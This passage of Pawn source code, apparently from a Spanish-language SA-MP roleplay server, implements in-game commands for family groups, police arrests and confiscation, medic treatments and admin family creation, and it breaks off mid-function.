COMMAND:freclutar(playerid, params[]){
	new string[128], player;
	if(!cuenta[playerid][cFamilia])return Mensaje(playerid, COLOR_ROJO, "Este comando es solo para familiares.");
	if(sscanf(params, "u", player))return Mensaje(playerid, COLOR_GRIS1, "Utiliza: /freclutar (Jugador/ID)");
	if(dDistanciaJugador(8.0, playerid, player)){
		if(IsPlayerConnected(player)){
			if(cuenta[playerid][cFamiliaRango] == 6){
				if(!cuenta[player][cFamilia]){
					if(booleano[Facturing]{player})return Mensaje(playerid, COLOR_ROJO, "Este jugador está en otra tarea, espera.");
					peticiones[player] = 5;
					peticionIDofertante[player] = playerid;
					booleano[Facturing]{player} = true;
					format(string, sizeof(string), "\t\t-- Invitacion a Familia --\t\t\n\t* %s le ofrece unirse a su familia, ¿acepta?", PlayerName(playerid));
					EnviarPeticion(player, string);
				}else Mensaje(playerid, COLOR_ROJO, "Este jugador ya pertenece a una familia.");
			}else Mensaje(playerid, COLOR_ROJO, "Usted no es el lider de esta familia.");
		}else Mensaje(playerid, COLOR_ROJO, "Este jugador no esta conectado.");
	}else Mensaje(playerid, COLOR_ROJO, "Este jugador esta muy lejos.");
	return 1;
}
COMMAND:fhechar(playerid, params[]){
	new string[128], faccid, player;
	if(!cuenta[playerid][cFamilia])return Mensaje(playerid, COLOR_ROJO, "Este comando es solo para familiares.");
	if(sscanf(params, "u", player))return Mensaje(playerid, COLOR_GRIS1, "Utiliza: /fhechar (Jugador/ID)");
	faccid = cuenta[playerid][cFamilia];

	if(dDistanciaJugador(8.0, playerid, player)){
		if(IsPlayerConnected(player)){
			if(cuenta[playerid][cFamiliaRango] == 6){
				if(faccid == cuenta[player][cFamilia]){
					cuenta[player][cFamilia] = 0;
					cuenta[player][cFamiliaRango] = 0;
					
					new Consulta[126];
					mysql_format(servidor[mysqlControl], Consulta, sizeof(Consulta), "UPDATE zz_usuarios SET fam=%d, famr=%d WHERE id = %d;", cuenta[player][cFamilia], cuenta[player][cFamiliaRango], cuenta[player][cUnico]);
					mysql_query(servidor[mysqlControl], Consulta, false);
					
					format(string, sizeof(string), "Usted acaba de expulsar de su famila a %s.", PlayerName(player));
					Mensaje(playerid, COLOR_ROJO, string);
					Mensaje(player, COLOR_ROJO, "Usted fue expulsado de la familia.");
				}else Mensaje(playerid, COLOR_ROJO, "Este miembro no pertenece a su familia.");
			}else Mensaje(playerid, COLOR_ROJO, "Usted no es el lider de esta familia.");
		}else Mensaje(playerid, COLOR_ROJO, "Este jugador no esta conectado.");
	}else Mensaje(playerid, COLOR_ROJO, "Este jugador esta muy lejos.");
	return 1;
}
COMMAND:fsalir(playerid, params[])
{
	if(!cuenta[playerid][cFamilia])return Mensaje(playerid, COLOR_ROJO, "Este comando es solo para familiares.");
	if(cuenta[playerid][cFamiliaRango] == 6)return Mensaje(playerid, COLOR_ROJO, "Usted es lider, contactar administrador.");
	
	cuenta[playerid][cFamilia] = 0;
	cuenta[playerid][cFamiliaRango] = 0;
	
	new Consulta[126];
	mysql_format(servidor[mysqlControl], Consulta, sizeof(Consulta), "UPDATE zz_usuarios SET fam=%d, famr=%d WHERE id = %d;", cuenta[playerid][cFamilia], cuenta[playerid][cFamiliaRango], cuenta[playerid][cUnico]);
	mysql_query(servidor[mysqlControl], Consulta, false);
	
	Mensaje(playerid, COLOR_ROJO, "Usted acaba de abandonar la familia.");
	return 1;
}
COMMAND:fmiembros(playerid, params[])
{
	new consulta[256], string[128], cnombre[24], faccid, rango;
	if(!cuenta[playerid][cFamilia])return Mensaje(playerid, COLOR_ROJO, "Este comando es solo para familiares.");
	faccid = cuenta[playerid][cFamilia];

	format(consulta, sizeof(consulta), "SELECT nombre, famr FROM zz_usuarios WHERE fam=%d;", faccid);
	new Cache:r = mysql_query(servidor[mysqlControl], consulta, true);

	Mensaje(playerid, COLOR_BLANCO, "Miembros de la familia:");
	for(new i=0;i<cache_get_row_count();i++)
	{
		cache_get_row(i, 0, cnombre, servidor[mysqlControl], sizeof(cnombre));
		rango = cache_get_row_int(i, 1, servidor[mysqlControl]);

		format(string, sizeof(string), "{FFA500}%s {FFFFFF}Rango {4169E1}%s(%d)", cnombre, ObtenerNombreRango(faccid, rango), rango);
		Mensaje(playerid, COLOR_BLANCO, string);
	}
	cache_delete(r);
	return 1;
}
COMMAND:fnombre(playerid, params[])
{
	new string[128], opcion[64], faccid;
	if(!cuenta[playerid][cFamilia])return Mensaje(playerid, COLOR_ROJO, "Este comando es solo para familiares.");
	if(sscanf(params, "s[64]", opcion))return Mensaje(playerid, COLOR_GRIS1, "/fnombre [Nombre de la familia]");
	if(strlen(opcion) < 4 || strlen(opcion) > 64)return Mensaje(playerid, COLOR_ROJO, "Caracteres minimos 4, maximos 64.");
	if(cuenta[playerid][cFamiliaRango] != 6)return Mensaje(playerid, COLOR_ROJO, "Usted no es el lider de esta familia.");

	faccid = cuenta[playerid][cFamilia];
	format(familias[faccid][fNombre], 64, "%s", opcion);

	Mensaje(playerid, COLOR_BLANCO, "Usted acaba de cambiarle el nombre a su familia.");
	format(string, sizeof(string), "Nombre de su familia es: %s", familias[faccid][fNombre]);
	Mensaje(playerid, COLOR_BLANCO, string);

	ActualizarFamilia(faccid);
	return 1;
}
COMMAND:frangos(playerid, params[])
{
	new string[128], opcion[24], item, faccid;
	if(!cuenta[playerid][cFamilia])return Mensaje(playerid, COLOR_ROJO, "Este comando es solo para familiares.");
	if(cuenta[playerid][cFamiliaRango] != 6)return Mensaje(playerid, COLOR_ROJO, "Usted no es el lider de esta familia.");
	if(sscanf(params, "ds[24]", item, opcion))return Mensaje(playerid, COLOR_GRIS1, "/frangos [nivel] [nombre rango]");
	if(strlen(opcion) < 4 || strlen(opcion) > 24)return Mensaje(playerid, COLOR_ROJO, "Caracteres minimos 4, maximos 24.");
	faccid = cuenta[playerid][cFamilia];

	switch(item){
		case 1:{
			format(familias[faccid][fRango0], 24, "%s", opcion);
			format(string, sizeof(string), "Cambio el nombre del rango %d a %s", item, familias[faccid][fRango0]);
			Mensaje(playerid, COLOR_BLANCO, string);
			ActualizarFamilia(faccid);
		}
		case 2:{
			format(familias[faccid][fRango1], 24, "%s", opcion);
			format(string, sizeof(string), "Cambio el nombre del rango %d a %s", item, familias[faccid][fRango1]);
			Mensaje(playerid, COLOR_BLANCO, string);
			ActualizarFamilia(faccid);
		}
		case 3:{
			format(familias[faccid][fRango2], 24, "%s", opcion);
			format(string, sizeof(string), "Cambio el nombre del rango %d a %s", item, familias[faccid][fRango2]);
			Mensaje(playerid, COLOR_BLANCO, string);
			ActualizarFamilia(faccid);
		}
		case 4:{
			format(familias[faccid][fRango3], 24, "%s", opcion);
			format(string, sizeof(string), "Cambio el nombre del rango %d a %s", item, familias[faccid][fRango3]);
			Mensaje(playerid, COLOR_BLANCO, string);
			ActualizarFamilia(faccid);
		}
		case 5:{
			format(familias[faccid][fRango4], 24, "%s", opcion);
			format(string, sizeof(string), "Cambio el nombre del rango %d a %s", item, familias[faccid][fRango4]);
			Mensaje(playerid, COLOR_BLANCO, string);
			ActualizarFamilia(faccid);
		}
		case 6:{
			format(familias[faccid][fRango5], 24, "%s", opcion);
			format(string, sizeof(string), "Cambio el nombre del rango %d a %s", item, familias[faccid][fRango5]);
			Mensaje(playerid, COLOR_BLANCO, string);
			ActualizarFamilia(faccid);
		}
		default: Mensaje(playerid, COLOR_ROJO, "Solo existen 6 rangos.");
	}
	return 1;
}
COMMAND:publicidad(playerid, params[]){
	if(IsPlayerInRangeOfPoint(playerid, 5.0, 1088.1642, -1377.9141, 13.8070)){
		if(!cuenta[playerid][cTelefono])return Mensaje(playerid, COLOR_GRIS, "No tienes teléfono, compra uno en la tienda electronica.");
		if(cuenta[playerid][cNivel] >= 6){
			ShowPlayerDialog(playerid, DIALOGO_PUBLICIDAD, DIALOG_STYLE_LIST, "[!]Publica tu anuncio", "Commerce - Comiseria\nIdlewood - 24/7\nCommerce - 24/7\nDowntown - Ammunation\nSanta Maria Beach - Autopista 1\nSanta Maria Beach - Autopista 2\nSanta Maria Beach - Autopista 3\nWillowfield - Basureros\nEast Los Santos - Puente Ganton\nGlenn Park - Estacionamiento", "Aceptar", "Cancelar");
		}else Mensaje(playerid, COLOR_ROJO, "Usted debe ser nivel 6 o superior para usar este comando.");
	}else Mensaje(playerid, COLOR_GRIS, "Usted no se encuentra en el centro de anuncios de la CNN.");
	return 1;
}
/************************************************************/
/******************[ Comandos Facciones ]********************/
/************************************************************/
COMMAND:estadoemergencia(playerid, params[])
{
	if(Gobierno(playerid) && cuenta[playerid][cRango] == 6)
	{
		if(!ESTemerg)
		{
			ESTemerg = true;
			for(new i=0; i<sizeof(ESTemergencia); i++)
			{
				ESTemergencia[i][ESTobjeto] = CreateDynamicObject(ESTemergencia[i][ESTmodelo], ESTemergencia[i][ESTpos][0], ESTemergencia[i][ESTpos][1], ESTemergencia[i][ESTpos][2], ESTemergencia[i][ESTrot][0], ESTemergencia[i][ESTrot][1], ESTemergencia[i][ESTrot][2]);
			}
			MensajeGlobal(0x00ACFFFF, "GOBIERNO: Estado de Emergencia! El Ayuntamiento queda cerrado temporalmente, porfavor evitar esta zona!");
		}
		else if(ESTemerg)
		{
			ESTemerg = false;
			for(new i=0; i<sizeof(ESTemergencia); i++)
			{
				DestroyDynamicObject(ESTemergencia[i][ESTobjeto]);
			}
			MensajeGlobal(0x00ACFFFF, "GOBIERNO: La zona del ayuntamiento ya fue liberada, se puede transitar normalmente!");
		}
	}
	else if(Team_LSPD(playerid) && cuenta[playerid][cRango] == 8)
	{
		if(!ESTemerg) 
		{
			ESTemerg = true;
			for(new i=0; i<sizeof(ESTemergencia); i++)
			{
				ESTemergencia[i][ESTobjeto] = CreateDynamicObject(ESTemergencia[i][ESTmodelo], ESTemergencia[i][ESTpos][0], ESTemergencia[i][ESTpos][1], ESTemergencia[i][ESTpos][2], ESTemergencia[i][ESTrot][0], ESTemergencia[i][ESTrot][1], ESTemergencia[i][ESTrot][2]);
			}
			MensajeGlobal(0x00ACFFFF, "LSPD: Estado de Emergencia! El Ayuntamiento queda cerrado temporalmente, porfavor evitar esta zona!");
		}
		else if(ESTemerg)
		{
			ESTemerg = false;
			for(new i=0; i<sizeof(ESTemergencia); i++)
			{
				DestroyDynamicObject(ESTemergencia[i][ESTobjeto]);
			}
			MensajeGlobal(0x00ACFFFF, "LSPD: La zona del ayuntamiento ya fue liberada, se puede transitar normalmente!");
		}
	}
	else if(cuenta[playerid][cAdministrador] >= 2012 && booleano[AdminDuty]{playerid})
	{
		if(!ESTemerg) 
		{
			ESTemerg = true;
			for(new i=0; i<sizeof(ESTemergencia); i++)
			{
				ESTemergencia[i][ESTobjeto] = CreateDynamicObject(ESTemergencia[i][ESTmodelo], ESTemergencia[i][ESTpos][0], ESTemergencia[i][ESTpos][1], ESTemergencia[i][ESTpos][2], ESTemergencia[i][ESTrot][0], ESTemergencia[i][ESTrot][1], ESTemergencia[i][ESTrot][2]);
			}
		}
		else if(ESTemerg)
		{
			ESTemerg = false;
			for(new i=0; i<sizeof(ESTemergencia); i++)
			{
				DestroyDynamicObject(ESTemergencia[i][ESTobjeto]);
			}
		}
	}else Mensaje(playerid, COLOR_GRIS, "Usted no esta autorizado para usar esto.");
	return 1;
}
COMMAND:quitar(playerid, params[])
{
	if(Team_LSPD(playerid) || Team_FBI(playerid))
	{
		new jugador, item, string[126];
		if(sscanf(params, "ud", jugador, item))
		{
			Mensaje(playerid, COLOR_GRIS, "Utiliza: /quitar [Usuario] [item]");
			Mensaje(playerid, COLOR_ROJO, "Item: 1- L.Conduccion 2- L.Moto 3- L.Armas 4- Drogas 5- Materiales 6- Armas 7- Semillas");
			return 1;
		}
		switch(item)
		{
			case 1:
			{
				cuenta[jugador][cLicenciaAuto] = 0;
				format(string, sizeof(string), "* Oficial %s quita la licencia de conducción a %s.", PlayerName(playerid), PlayerName(jugador));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}
			case 2:
			{
				cuenta[jugador][cLicenciaMoto] = 0;
				format(string, sizeof(string), "* Oficial %s quita la licencia de moto a %s.", PlayerName(playerid), PlayerName(jugador));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}
			case 3:
			{
				cuenta[jugador][cLicenciaArma] = 0;
				format(string, sizeof(string), "* Oficial %s quita la licencia de Armas a %s.", PlayerName(playerid), PlayerName(jugador));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}
			case 4:
			{
				cuenta[jugador][cHeroina] = 0;
				cuenta[jugador][cMarihuana] = 0;
				cuenta[jugador][cRitalin] = 0;
				cuenta[jugador][cExtasis] = 0;
				cuenta[jugador][cSpeed] = 0;
				format(string, sizeof(string), "* Oficial %s quita las drogas a %s.", PlayerName(playerid), PlayerName(jugador));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}			
			case 5:
			{
				cuenta[jugador][cMateriales] = 0;
				format(string, sizeof(string), "* Oficial %s quita los materiales a %s.", PlayerName(playerid), PlayerName(jugador));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}
			case 6:
			{
				quitarArmas(jugador);
				format(string, sizeof(string), "* Oficial %s le quita las armas a %s.", PlayerName(playerid), PlayerName(jugador));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}
			case 7:
			{
				cuenta[jugador][cSemillas][0] = 0;
				cuenta[jugador][cSemillas][1] = 0;
				cuenta[jugador][cSemillas][2] = 0;
				cuenta[jugador][cSemillas][3] = 0;
				cuenta[jugador][cSemillas][4] = 0;
				format(string, sizeof(string), "* Oficial %s quita las semillas a %s.", PlayerName(playerid), PlayerName(jugador));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}
			default: Mensaje(playerid, COLOR_GRIS, "Este item no es valido.");
		}
	}else return Mensaje(playerid, COLOR_GRIS2, "No puedes hacer esto!");
	return 1;
}
COMMAND:arrestar(playerid, params[]){
	new player, minuto, multa, fianza, string[128];
	if(Team_LSPD(playerid) || Team_FBI(playerid))
	{
		if(sscanf(params, "uiii", player, minuto, multa, fianza))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /arrestar <PlayerID> <Minutos> <Multa$> <Fianza$>");
		if(IsPlayerInRangeOfPoint(playerid, 10.0, 2046.4567, -2075.2861, 13.6079)){
			if(!dDistanciaJugador(5.0, playerid, player))return Mensaje(playerid, COLOR_GRIS, "Jugador muy lejos.");
			if(minuto < 0 || minuto > 120)return Mensaje(playerid, COLOR_GRIS, "El máximo de minutos es 120.");
			if(multa < 0 || multa > 12000)return Mensaje(playerid, COLOR_GRIS, "El máximo de precio es 12000$");
			if(fianza < 0 || fianza > 9999999)return Mensaje(playerid, COLOR_GRIS, "Máximo fianza: 9, 999, 999$ (Sin fianza)");

			pierdeDinero(player, multa);
			SetPlayerSkin(player, 8);
			quitarArmas(player);
			
			for(new x=0;x<6;x++)
			{
				inventario[player][invArmas][x] = 0;
				inventario[player][invBalas][x] = 0;
			}
			
			cuenta[player][cHeroina] = 0;
   			cuenta[player][cMarihuana] = 0;
      		cuenta[player][cRitalin] = 0;
        	cuenta[player][cExtasis] = 0;
         	cuenta[player][cSpeed] = 0;
         	cuenta[player][cMateriales] = 0;

			cuenta[player][cTiempoCarcel] = minuto * 60;
			cuenta[player][cCarcel] = 3;

			for(new i=0;i<5;i++){
				cuenta[player][cSemillas][i] = 0;
			}

			format(string, sizeof(string), "{FFFFFF}Noticias {EE0000}SA {00B546}CNN+{FFFFFF} 'Sospechoso {FF9900}%s {FFFFFF}ha sido arrestado por %d Dias'", PlayerName(player), minuto);
			MensajeGlobal(-1, string);

			format(string, sizeof(string), "[ Sospechoso %s encarcelado por %d minutos, multa %d$, fianza %d$ - Oficial: %s ]", PlayerName(player), minuto, multa, fianza, PlayerName(playerid));
			MensajeAmbos(playerid, player, COLOR_BLANCO, string);
			SetPosEx(player, 2043.3182, -2066.0278, 13.5889, 177.9065, 0, 0);
		}
	}
	return 1;
}
COMMAND:darlicencia(playerid, params[])
{
	new player;
	if(sscanf(params, "u", player))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /darlicencia [Jugador]");
	if(!IsACop(playerid) || cuenta[playerid][cRango] < 4)return Mensaje(playerid, COLOR_GRIS2, "No eres de la LSPD o tu rango es muy bajo!");
	if(IsPlayerConnected(player))
	{
		if(dDistanciaJugador(5.0, playerid, player))
		{
			new string[144];
			cuenta[player][cLicenciaArma] = 1;
			format(string, sizeof(string), "* %s le da una licencia de arma a %s", PlayerName(playerid), PlayerName(player));
			ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			Mensaje(playerid, COLOR_AMARILLO2, "* Has obtenido la licencia de armas.");
		}else Mensaje(playerid, COLOR_GRIS2, "Jugador demasiado lejos.");
	}else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
	return 1;
}
COMMAND:examinar(playerid, params[])
{
	new jugador, string[144];
	if(!Team_SAMUR(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres médico.");
	if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "No estas de servicio.");
	if(sscanf(params, "u", jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /Examinar (jugador)");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado.");
	if(dDistanciaJugador(5.0, playerid, jugador)){
		if(cuenta[jugador][cEnfermedad]){
			format(string, sizeof(string), ">>> {ffffff}Usted examino correctamente a %s, padece de: %s", PlayerName(jugador), EnfermedadTipo(cuenta[jugador][cEnfermedad]));
			Mensaje(playerid, COLOR_AMARILLO2, string);
		}
		if(cuenta[jugador][cEnfermedad2]){
			format(string, sizeof(string), ">>> {ffffff}Usted examino correctamente a %s, padece de: %s", PlayerName(jugador), EnfermedadTipo(cuenta[jugador][cEnfermedad2]));
			Mensaje(playerid, COLOR_AMARILLO2, string);
		}
		if(cuenta[jugador][cEnfermedad3]){
			format(string, sizeof(string), ">>> {ffffff}Usted examino correctamente a %s, padece de: %s", PlayerName(jugador), EnfermedadTipo(cuenta[jugador][cEnfermedad3]));
			Mensaje(playerid, COLOR_AMARILLO2, string);
		}
		format(string, sizeof(string), "El doctor %s te examino.", PlayerName(playerid));
		Mensaje(jugador, COLOR_GRIS2, string);
	}else return Mensaje(playerid, COLOR_GRIS2, "Este jugador esta demasiado lejos.");
	return 1;
}
COMMAND:diagnostico(playerid, params[])
{
	new jugador, string[144];
	if(!Team_SAMUR(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres médico.");
	if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "No estas de servicio.");
	if(sscanf(params, "u", jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /Diagnostico (jugador)");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado.");
	if(dDistanciaJugador(5.0, playerid, jugador)){
		format(string, sizeof(string), "1.- {ffffff}Diagnostico padece de: %s", EnfermedadTipo(cuenta[jugador][cEnfermedad]));
		Mensaje(jugador, COLOR_AMARILLO2, string);
		format(string, sizeof(string), "2.- {ffffff}Diagnostico padece de: %s", EnfermedadTipo(cuenta[jugador][cEnfermedad2]));
		Mensaje(jugador, COLOR_AMARILLO2, string);
		format(string, sizeof(string), "3.- {ffffff}Diagnostico padece de: %s", EnfermedadTipo(cuenta[jugador][cEnfermedad3]));
		Mensaje(jugador, COLOR_AMARILLO2, string);

		AccionMe(playerid, "entrega los examenes hechos.");
		AccionMe(jugador, "recibe los examenes del doctor.");
	}else return Mensaje(playerid, COLOR_GRIS2, "Este jugador esta demasiado lejos.");
	return 1;
}
COMMAND:operar(playerid, params[])
{
	new jugador, string[144], str[12];
	if(!Team_SAMUR(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres médico.");
	if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "No estas de servicio.");
	if(sscanf(params, "u", jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /operar (jugador)");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado.");

	switch(random(6)){
		case 1: str = "Hígado";
		case 2: str = "Pancreas";
		case 3: str = "Pulmón";
		case 4: str = "Corazón";
		case 5: str = "Sangre";
		case 6: str = "Estomago";
	}

	if(dDistanciaJugador(5.0, playerid, jugador)){
		if(IsPlayerInRangeOfPoint(playerid, 5.0, 253.7231, 127.3842, 1032.0173) || IsPlayerInRangeOfPoint(playerid, 5.0, 265.6658, 127.4198, 1037.7197)){
			if(cuenta[jugador][cEnfermedad] >= 19){
				if(!booleano[Transplante]{playerid}){
					format(string, sizeof(string), "Necesita un transplante de %s", str);
					Mensaje(playerid, COLOR_ROJO, string);
					return 1;
				}
				booleano[Transplante]{playerid} = false;
				cuenta[jugador][cEnfermedad] = 0;
				Mensaje(playerid, COLOR_VERDE, "Usted opero con exito.");
			}
			else if(cuenta[jugador][cEnfermedad2] >= 19){
				if(!booleano[Transplante]{playerid}){
					format(string, sizeof(string), "Necesita un transplante de %s", str);
					Mensaje(playerid, COLOR_ROJO, string);
					return 1;
				}
				booleano[Transplante]{playerid} = false;
				cuenta[jugador][cEnfermedad2] = 0;
				Mensaje(playerid, COLOR_VERDE, "Usted opero con exito.");
			}
			else if(cuenta[jugador][cEnfermedad3] >= 19){
				if(!booleano[Transplante]{playerid}){
					format(string, sizeof(string), "Necesita un transplante de %s", str);
					Mensaje(playerid, COLOR_ROJO, string);
					return 1;
				}
				booleano[Transplante]{playerid} = false;
				cuenta[jugador][cEnfermedad3] = 0;
				Mensaje(playerid, COLOR_VERDE, "Usted opero con exito.");
			}else Mensaje(playerid, COLOR_GRIS2, "Este jugador no tiene una enfermedad operable.");
		}else return Mensaje(playerid, COLOR_GRIS2, "No esta en la sala de operacion.");
	}else return Mensaje(playerid, COLOR_GRIS2, "Este jugador esta demasiado lejos.");
	return 1;
}
COMMAND:transplante(playerid, params[]){
	new jugador, item, string[144], str[12];
	if(!Team_SAMUR(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres médico.");
	if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "No estas de servicio.");
	if(sscanf(params, "ud", jugador, item))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /transplante (jugador) (1:Higado - 2:Pancreas - 3:Pulmón - 4:Corazón - 5:Sangre - 6:Estomago)");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado.");
	switch(item){
		case 1: str = "Hígado";
		case 2: str = "Pancreas";
		case 3: str = "Pulmón";
		case 4: str = "Corazón";
		case 5: str = "Sangre";
		case 6: str = "Estomago";
		default: return Mensaje(playerid, COLOR_GRIS2, "Transplante erroneo.");
	}
	format(string, sizeof(string), "hace un transplante de %s al paciente %s", str, PlayerName(jugador));

	if(dDistanciaJugador(5.0, playerid, jugador)){
		if(IsPlayerInRangeOfPoint(playerid, 5.0, 253.7231, 127.3842, 1032.0173) || IsPlayerInRangeOfPoint(playerid, 5.0, 265.6658, 127.4198, 1037.7197)){
			if(cuenta[jugador][cEnfermedad] >= 19){
				booleano[Transplante]{playerid} = true;
				AccionMe(playerid, string);
				Mensaje(playerid, COLOR_VERDE, "Usted opero con exito.");
			}
			else if(cuenta[jugador][cEnfermedad2] >= 19){
				booleano[Transplante]{playerid} = true;
				AccionMe(playerid, string);
				Mensaje(playerid, COLOR_VERDE, "Usted opero con exito.");
			}
			else if(cuenta[jugador][cEnfermedad3] >= 19){
				booleano[Transplante]{playerid} = true;
				AccionMe(playerid, string);
				Mensaje(playerid, COLOR_VERDE, "Usted opero con exito.");
			}else Mensaje(playerid, COLOR_GRIS2, "Este jugador no tiene una enfermedad operable.");
		}else return Mensaje(playerid, COLOR_GRIS2, "No esta en la sala de operacion.");
	}else return Mensaje(playerid, COLOR_GRIS2, "Este jugador esta demasiado lejos.");
	return 1;
}
COMMAND:curar(playerid, params[])
{
	new jugador;
	if(!Team_SAMUR(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres médico.");
	if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "No estas de servicio.");
	if(sscanf(params, "u", jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /curar (jugador)");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado.");
	if(dDistanciaJugador(5.0, playerid, jugador)){
		if(cuenta[jugador][cEnfermedad] <= 18 && cuenta[jugador][cEnfermedad] != 0){
			cuenta[jugador][cEnfermedad] = 0;
			Mensaje(playerid, COLOR_VERDE, "Usted curo con exito.");
			Mensaje(jugador, COLOR_VERDE, "Te han curado con exito.");
		}else if(cuenta[jugador][cEnfermedad2] <= 18 && cuenta[jugador][cEnfermedad2] != 0){
			cuenta[jugador][cEnfermedad2] = 0;
			Mensaje(playerid, COLOR_VERDE, "Usted curo con exito.");
			Mensaje(jugador, COLOR_VERDE, "Te han curado con exito.");
		}else if(cuenta[jugador][cEnfermedad3] <= 18 && cuenta[jugador][cEnfermedad3] != 0){
			cuenta[jugador][cEnfermedad3] = 0;
			Mensaje(playerid, COLOR_VERDE, "Usted curo con exito.");
			Mensaje(jugador, COLOR_VERDE, "Te han curado con exito.");
		}else Mensaje(playerid, COLOR_GRIS2, "Este jugador no tiene una enfermedad curable.");
	}else return Mensaje(playerid, COLOR_GRIS2, "Este jugador esta demasiado lejos.");
	return 1;
}
COMMAND:sangre(playerid, params[])
{
	new jugador, string[64];
	if(!Team_SAMUR(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres médico.");
	if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "No estas de servicio.");
	if(sscanf(params, "u", jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /sangre (jugador)");
	if(dDistanciaJugador(5.0, playerid, jugador)){
		SetHP(jugador, 100.0);
		format(string, sizeof(string), "Usted curo con exito a %s.", PlayerName(jugador));
		Mensaje(playerid, COLOR_AZUL_CLARO, string);
		format(string, sizeof(string), "%s lo curo con exito.", PlayerName(playerid));
		Mensaje(jugador, COLOR_AZUL_CLARO, string);
	}else return Mensaje(playerid, COLOR_GRIS2, "Este jugador esta demasiado lejos.");
	return 1;
}
COMMAND:quemarcosecha(playerid, params[])
{
	if(Team_FBI(playerid) || IsACop(playerid) || cuenta[playerid][cAdministrador] >= 2){
		for(new f=0;f<MAX_SEMILLAS_SEMBRADAS;f++){
			if(IsPlayerInRangeOfPoint(playerid, 1, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2])){
				if(semillas[f][sSlot]){
					DestroyDynamic3DTextLabel(semillas[f][sLabel]);
					DestroyDynamicObject(semillas[f][sObjeto]);
					format(semillas[f][sDueno], 24, "SinDueno");
					semillas[f][sSlot] = false;
					Mensaje(playerid, COLOR_BLANCO, "Usted acaba de quemar una cosecha.");
					break;
				}
			}
		}
	}else return Mensaje(playerid, COLOR_ROJO, "Usted no es oficial de policia.");
	return 1;
}
/************************************************************/
/**************[ Comandos Administrativos ]******************/
/************************************************************/
//General
COMMAND:removerpublicidad(playerid, params[]){
	if(cuenta[playerid][cAdministrador] < 6)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid}){
		Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
		return 1;
	}
	ShowPlayerDialog(playerid, DIALOG_EDITAR_PUBLICIDAD, DIALOG_STYLE_LIST, "[!]Edita un anuncio", "Commerce - Comiseria\nIdlewood - 24/7\nCommerce - 24/7\nDowntown - Ammunation\nSanta Maria Beach - Autopista 1\nSanta Maria Beach - Autopista 2\nSanta Maria Beach - Autopista 3\nWillowfield - Basureros\nEast Los Santos - Puente Ganton\nGlenn Park - Estacionamiento", "Aceptar", "Cancelar");
	return 1;
}
//familias
COMMAND:setfamilia(playerid, params[]){
	new opcion[12], player, string[128];
	if(cuenta[playerid][cAdministrador] < 2012)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid}){
		Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
		return 1;
	}
	if(sscanf(params, "s[12]D(1500)", opcion, player))return Mensaje(playerid, COLOR_BLANCO, "/setfamilia (crear - eliminar)");
	if(!strcmp(opcion, "crear")){
		if(player == 1500)return Mensaje(playerid, COLOR_BLANCO, "/setfamilia crear (Jugador/ID)");
		if(!IsPlayerConnected(player))return Mensaje(playerid, COLOR_BLANCO, "Este jugador no esta conectado.");
		for(new i=1;i<MAX_FAMILIAS;i++){
			if(!familias[i][fOcupado]){
				familias[i][fOcupado] = 1;
				cuenta[player][cFamilia] = i;
				cuenta[player][cFamiliaRango] = 6;
				
				format(string, sizeof(string), "%s le otorgaron una familia, Utiliza: /familia", PlayerName(player));
